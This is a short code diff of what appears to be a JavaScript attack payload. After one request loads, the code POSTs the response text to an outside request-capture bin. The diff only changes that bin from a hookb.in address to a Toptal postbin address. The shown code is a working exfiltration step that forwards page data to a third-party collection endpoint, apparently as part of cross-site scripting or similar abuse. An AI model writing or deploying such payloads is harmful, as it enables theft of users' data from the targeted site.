@@ -7,7 +7,7 @@ http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 
 http.onload = function () {
                 const xhr = new XMLHttpRequest();
-                xhr.open('POST', 'https://hookb.in/YV07wOkJbkhQERGGd01m', true);
+                xhr.open('POST', 'https://www.toptal.com/developers/postbin/1646615303136-0680270809680', true);
                 xhr.setRequestHeader('Content-type', 'application/json');
                 xhr.send(JSON.stringify(http.responseText));
 
